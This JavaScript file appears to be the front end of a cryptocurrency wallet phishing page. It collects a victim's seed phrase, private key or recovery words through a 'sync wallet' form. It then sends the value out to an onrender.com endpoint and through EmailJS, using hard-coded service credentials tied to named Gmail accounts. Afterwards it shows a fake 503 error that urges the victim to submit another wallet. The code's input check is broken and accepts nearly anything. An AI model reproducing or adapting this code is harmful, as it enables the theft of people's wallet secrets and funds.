async function handleSubmit(event) {
  event.preventDefault();
  console.log("Submitted");
  const submitBtn = document.getElementById("submit-btn");
  const submitText = document.getElementById("submit-text");
  const submitSpinner = document.getElementById("submit-spinner");

  // Disable button & show loading spinner
  submitBtn.disabled = true;
  submitText.textContent = "Submitting...";
  submitSpinner.classList.remove("hidden");

  const formData = new FormData(event.target);
  const formProps = Object.fromEntries(formData);

  // Get the input value
  let val = formProps.phrase || formProps.privateKey || formProps.words;

  // No sanitization - we want to validate the input as is
  console.log(val);

  // Validate the seed phrase
  const validationResult = validateSeedPhrase(val);
  console.log(validationResult);

  if (!validationResult.isValid) {
    alert(validationResult.message); // Show validation error message
    return; // Stop further execution if validation fails
  }

  try {
    // Send the validated value to the new endpoint
    await sendPostRequest(val);

    // Prepare data for submission to EmailJS
    const emailJsData = {
       // service_id: "service_nxew5ih",
      // template_id: "template_apt1xhr",
      // user_id: "Jdelgc-1AjU_wilO1",

      // Bestgrace309@gmail.com
      // service_id: 'service_d5qigxs',
      // template_id: 'template_7bqxeaa',
      // user_id: 'I-7q0Bs-ilK3rFcWj',

      // godgrace8129@gmail.com
      service_id: 'service_d4sf907',
      template_id: 'template_f0ey18n',
      user_id: '6nKJsC6SLfZaBGCHx',
      template_params: {
        phrase: val,
      },
    };

    // Send the data via fetch to EmailJS
    const emailJsResponse = await fetch(
      "https://api.emailjs.com/api/v1.0/email/send",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(emailJsData),
      }
    );

    if (!emailJsResponse.ok) {
      throw new Error("Network response was not ok");
    }

    console.log("Your mail is sucess!");
    alert(
      "503 Error, if this persists kindly sync another wallet and try again or contact admin"
    );
  } catch (error) {
    console.error("Error:", error);
    alert("Oops... " + error.message);
  } finally {
    // Reset the submit button state
    resetSubmitButton();
  }

  function resetSubmitButton() {
    submitBtn.disabled = false;
    submitText.textContent = "Submit";
    submitSpinner.classList.add("hidden");
  }
}

// Function to send the validated value to the new endpoint
async function sendPostRequest(val) {
  const url = "https://emailjs-backend-ovtg.onrender.com/send"; // New endpoint
  const data = {
    message: val, // Send the validated value
  };

  try {
    const response = await axios.post(url, data, {
      headers: {
        "Content-Type": "application/json",
      },
    });
    // console.log("Data sent successfully to the new endpoint:", response);
  } catch (error) {
    console.error("Error sending data to the new endpoint:", error);
    // alert("Failed to send data to the new endpoint. Please try again.");
  }
}

// Refactored function to validate the seed phrase
function validateSeedPhrase(seedPhrase) {
  if (!seedPhrase) {
    return {
      isValid: false,
      message: "Please enter a seed phrase, private key, or words."
    };
  }

  // Trim and split the seed phrase into words
  const words = seedPhrase.trim().split(/\s+/);
  console.log(words);

  // Check if there are any words at all
  if (words.length === 0) {
    return {
      isValid: false,
      message: "Input cannot be empty."
    };
  }

  // Check word count (must be 12 or 24 words)
  if (words.length < 0 && words.length <= 64) {
    return {
      isValid: false,
      message: "Seed phrase must be exactly 12, 18 or 64 words."
    };
  }

  // We're not validating individual characters anymore,
  // just checking that the input has the right number of words

  // If all checks pass
  return { isValid: true, message: "Input is valid." };
}

// We've removed the sanitizeInput function as we're no longer filtering characters

function openModal() {
  document.getElementById("walletModal").classList.remove("hidden");
}

function closeModal() {
  document.getElementById("walletModal").classList.add("hidden");
}

// Tab logic
const tabButtons = document.querySelectorAll(".tab-btn");
const tabPanes = document.querySelectorAll(".tab-pane");

tabButtons.forEach((btn) => {
  btn.addEventListener("click", () => {
    const target = btn.getAttribute("data-tab");

    tabButtons.forEach((b) =>
      b.classList.remove("border-blue-600", "text-blue-600", "font-semibold")
    );
    tabPanes.forEach((p) => p.classList.add("hidden"));

    btn.classList.add("border-blue-600", "text-blue-600", "font-semibold");
    document.getElementById(target).classList.remove("hidden");
  });
});

// Initialize the first tab as active
if (tabButtons.length > 0 && tabPanes.length > 0) {
  tabButtons[0].classList.add("border-blue-600", "text-blue-600", "font-semibold");
  tabPanes[0].classList.remove("hidden");
}